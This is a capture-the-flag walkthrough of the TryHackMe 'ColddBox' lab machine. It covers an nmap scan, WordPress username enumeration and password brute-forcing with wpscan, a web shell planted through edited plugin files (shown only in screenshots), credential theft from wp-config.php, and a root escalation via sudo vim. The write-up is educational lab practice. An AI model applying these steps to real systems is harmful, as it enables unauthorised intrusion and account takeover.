# ColddBox

***
![](https://tryhackme-images.s3.amazonaws.com/room-icons/442c3b7bab5e3f52b5341cfa9e52e5c0.png)

## Difficulty = Easy

***

running our nmap scan we have -:

```bash
# Nmap 7.94 scan initiated Wed Oct 25 23:53:54 2023 as: nmap -p80,4512 -sCV -T4 -v --min-rate=1000 -oN nmap.txt 10.10.44.62
Nmap scan report for 10.10.44.62
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: ColddBox | One more machine
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
|_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Oct 25 23:54:13 2023 -- 1 IP address (1 host up) scanned in 18.58 seconds
```

Navigating to port `80/HTTP` we have a word press website


![](https://i.imgur.com/ktOjuQR.png)

Running a word press scanner called `wpscan` , i was able to find some valid usernames we can try to bruteforce under `/wp-login.php`

```bash
$ wpscan --url http://10.10.44.62/ -e u,cb --verbose
```


![](https://i.imgur.com/Ss4Y4DJ.png)

Nice, so we have **hugo**, **c0ldd** and **philip**, we can also navigate to `/wp-login.php` and try out this usernames with the wrong password to confirm if it is true

![](https://i.imgur.com/WIEoBq2.png)


We can therefore save this username into a text file and bruteforce with `wpscan`

```bash
$ wpscan --url http://10.10.44.62/ -U users.txt -P /usr/share/wordlists/rockyou.txt
```

We found only one user password which is user **c0ldd**

![](https://i.imgur.com/6nMJOkO.png)


We can therefore upload our shell by changing the content of the plugin files and navigating to the URL


![](https://i.imgur.com/C8fiavE.png)


**The URL :**

![](https://i.imgur.com/tkiFArP.png)

We got our shell back as user **www-data**

![](https://i.imgur.com/Z5JWaca.png)


Navigating to the `/var/www/html` directory we have the **wp-config.php** file

![](https://i.imgur.com/WIXO1zB.png)

concatenating it gives us user **c0ldd** password

![](https://i.imgur.com/rlfKv5g.png)

we can therefore `su` to user **c0ldd** 

![](https://i.imgur.com/rd19yFQ.png)

Running `sudo -l` we see that we have the permission to run vim, chmod and ftp with super user permissions

![](https://i.imgur.com/2zFVR5e.png)

i will be using `/usr/bin/vim` to gain root, on the command line do

```bash
$ sudo /usr/bin/vim
```

Hit enter and You should then be given a prompt like this

![](https://i.imgur.com/1ahGNab.png)

Then just type in `:shell` and you should be root

![](https://i.imgur.com/tq5IeNg.png)

GG 😃

<button onclick="window.location.href='https://sec-fortress.github.io';">Back To Home螥</button>
